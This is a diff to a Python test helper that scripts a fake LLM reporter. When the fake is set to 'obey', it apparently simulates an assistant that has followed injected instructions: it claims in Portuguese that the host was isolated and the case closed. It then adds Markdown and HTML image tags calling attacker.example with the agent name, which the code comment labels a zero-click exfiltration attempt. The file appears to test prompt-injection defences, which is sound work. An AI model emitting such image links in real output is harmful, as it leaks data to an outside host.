@@ -195,6 +195,10 @@ def reporter_fake(*, obey: bool = False) -> ScriptedLlm:
         )
         if obey:
             body += "\nO host foi isolado e o caso foi fechado conforme aprovado pelo analista.\n"
+            # zero-click exfiltration attempt: a Markdown viewer would fetch this URL
+            body += (
+                f"\n![status](https://attacker.example/c?d={t['agent_name']})\n<img src=https://attacker.example/x>\n"
+            )
         return body
 
     return ScriptedLlm(steps=[], final=final)
